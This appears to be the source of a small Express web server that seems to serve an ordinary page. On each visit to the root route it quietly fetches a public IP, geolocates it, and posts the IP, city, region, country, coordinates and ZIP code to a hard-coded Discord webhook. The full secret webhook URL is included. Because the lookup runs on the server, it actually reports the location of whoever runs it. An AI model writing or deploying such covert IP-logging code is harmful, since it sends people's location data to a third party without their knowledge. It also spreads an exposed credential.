const express = require('express');
const app = express();
const axios = require('axios');
const morgan = require('morgan');
const path = require('path');

const domain = 'http://localhost:3000';

app.get('/', async (req, res) => {
	const { data } = await axios.get('https://api.ipify.org?format=json');
	const response = await axios.get('https://ipinfo.io/' + data.ip + '/json')
	await axios.post('https://discord.com/api/webhooks/853111597182091264/pN9rlW2P3j9Obz1Nsny8oY36SsHGxVzo7HaGhXk6RKFDhHsKGekplQz-uID08t0HI73f', {
		content: '**Nueva IP registrada:** ' + data.ip + `\n**City:** ${response.data.city}\n**Region:** ${response.data.region}\n**Country:** ${response.data.country}\n**Loc:** ${response.data.loc}\n**ZIP:** ${response.data.postal ? response.data.postal : "Nope"}
		`
	});

	res.sendFile(path.join(__dirname + '/public/index.html'));
});

app.set('port', process.env.PORT || 3000);

app.use(express.static(path.join(__dirname + '/public')));

app.use(morgan('dev'));

app.use((req, res, next) => {
    res.status(404).sendFile(__dirname + '/public/error.html');
});

app.listen(app.get('port'), () => {
	console.log("server running")
});

